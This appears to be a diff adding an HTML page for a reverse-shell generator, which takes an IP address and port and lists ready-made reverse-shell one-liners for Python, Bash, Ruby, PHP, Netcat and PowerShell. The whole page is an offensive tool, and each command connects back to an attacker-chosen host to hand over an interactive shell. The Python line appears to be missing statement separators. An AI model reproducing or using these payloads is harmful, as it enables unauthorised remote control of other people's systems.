@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <script src="reverse.js"></script>
+    <title>reverse shell</title>
+</head>
+<style>
+  body {background-color: black;}
+  
+  </style>
+<body>
+    <div class="input-group flex-nowrap">
+        <span class="input-group-text" id="addon-wrapping">IP</span>
+        <input type="text" class="form-control" id="IP" placeholder="IP.." aria-label="Username" aria-describedby="addon-wrapping">
+        <span class="input-group-text" id="addon-wrapping">PORT</span>
+        <input type="text" id="PORT" class="form-control"  placeholder="PORT.." aria-label="Username" aria-describedby="addon-wrapping">
+        <button type="button" id="gen" class="btn btn-danger">Generate</button>
+
+      </div>
+      <div class="alert alert-success">
+        <strong>Python</strong><p id="python">python -c 'import sys,socket,os,pty;s=socket.socket()s.connect((os.getenv("IP"),int(os.getenv("PORT"))))[os.dup2(s.fileno(),fd) for fd in (0,1,2)]pty.spawn("/bin/sh")'</p>
+      </div>
+      <div class="alert alert-warning">
+        <strong>Bash</strong><p id="bash">bash -c 'exec bash -i &>/dev/tcp/IP/PORT <&1'</p>
+      </div>
+      <div class="alert alert-danger">
+        <strong>Ruby!</strong> <p id="ruby">ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["IP"],ENV["PORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</p>
+      </div>
+      <div class="alert alert-info">
+        <strong>PHP</strong><p id="php">php -r '$sock=fsockopen(getenv("IP"),getenv("PORT"));exec("/bin/sh -i <&3 >&3 2>&3");'</p>
+      </div>
+      <div class="alert alert-warning">
+        <strong>Netcat</strong><p id="netcat">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f</p>
+      </div>
+      <div class="alert alert-info">
+        <strong>PowerShell</strong><p id="powershell">powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</p>
+      </div>
+      
+</body>
+</html>
